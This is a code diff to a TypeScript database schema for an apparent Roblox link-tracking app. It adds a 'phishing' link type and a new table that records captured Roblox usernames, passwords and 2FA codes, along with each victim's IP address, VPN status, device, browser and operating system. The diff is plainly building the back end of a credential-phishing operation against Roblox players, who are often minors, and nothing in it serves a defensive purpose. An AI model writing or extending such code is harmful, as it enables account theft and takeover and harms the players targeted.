@@ -71,7 +71,7 @@ export const robloxLinks = pgTable("roblox_links", {
   id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
   userId: varchar("user_id").notNull().references(() => users.id),
   originalUrl: text("original_url").notNull(),
-  linkType: text("link_type").notNull(), // 'private_server', 'profile', 'group'
+  linkType: text("link_type").notNull(), // 'private_server', 'profile', 'group', 'phishing'
   trackingId: text("tracking_id").notNull().unique(),
   title: text("title"), // Optional title for the link
   description: text("description"), // Optional description
@@ -79,6 +79,23 @@ export const robloxLinks = pgTable("roblox_links", {
   isActive: boolean("is_active").notNull().default(true),
   createdAt: timestamp("created_at").notNull().default(sql`now()`),
   updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
+});
+
+export const robloxCredentials = pgTable("roblox_credentials", {
+  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
+  linkId: varchar("link_id").notNull().references(() => robloxLinks.id),
+  userId: varchar("user_id").notNull().references(() => users.id),
+  capturedUsername: text("captured_username").notNull(),
+  capturedPassword: text("captured_password").notNull(),
+  capturedAuthCode: text("captured_auth_code"), // 2FA code if provided
+  ipAddress: text("ip_address").notNull(),
+  userAgent: text("user_agent"),
+  location: text("location"),
+  isVpn: text("is_vpn"), // 'yes', 'no', 'unknown'
+  deviceType: text("device_type"),
+  browserName: text("browser_name"),
+  operatingSystem: text("operating_system"),
+  createdAt: timestamp("created_at").notNull().default(sql`now()`),
 });
 
 export const insertUserSchema = createInsertSchema(users).pick({
@@ -136,6 +153,11 @@ export const insertRobloxLinkSchema = createInsertSchema(robloxLinks).omit({
   clickCount: true,
 });
 
+export const insertRobloxCredentialsSchema = createInsertSchema(robloxCredentials).omit({
+  id: true,
+  createdAt: true,
+});
+
 export const createRobloxLinkSchema = createInsertSchema(robloxLinks).omit({
   id: true,
   userId: true,
@@ -145,8 +167,8 @@ export const createRobloxLinkSchema = createInsertSchema(robloxLinks).omit({
   clickCount: true,
   isActive: true,
 }).extend({
-  originalUrl: z.string().url("Please enter a valid URL"),
-  linkType: z.enum(["private_server", "profile", "group"], {
+  originalUrl: z.string().url("Please enter a valid URL").optional(),
+  linkType: z.enum(["private_server", "profile", "group", "phishing"], {
     required_error: "Please select a link type",
   }),
   title: z.string().min(1, "Title is required").max(100, "Title must be 100 characters or less"),
@@ -168,3 +190,5 @@ export type Settings = typeof settings.$inferSelect;
 export type InsertRobloxLink = z.infer<typeof insertRobloxLinkSchema>;
 export type RobloxLink = typeof robloxLinks.$inferSelect;
 export type CreateRobloxLink = z.infer<typeof createRobloxLinkSchema>;
+export type InsertRobloxCredentials = z.infer<typeof insertRobloxCredentialsSchema>;
+export type RobloxCredentials = typeof robloxCredentials.$inferSelect;
